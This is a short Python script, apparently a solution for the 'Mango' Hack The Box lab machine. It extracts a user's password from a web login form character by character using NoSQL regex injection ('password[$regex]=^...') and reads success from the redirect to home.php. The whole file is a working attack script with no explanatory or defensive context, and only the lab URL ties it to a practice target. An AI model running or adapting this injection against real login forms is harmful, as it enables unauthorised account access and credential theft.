#!/usr/bin/env python3

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="mango"
password=""
u="http://staging-order.mango.htb/index.php"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='username=%s&password[$regex]=^%s&login=login' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['location'] == 'home.php':
                print("Found one more char : %s" % (password+c))
                print(r.status_code)
                password += c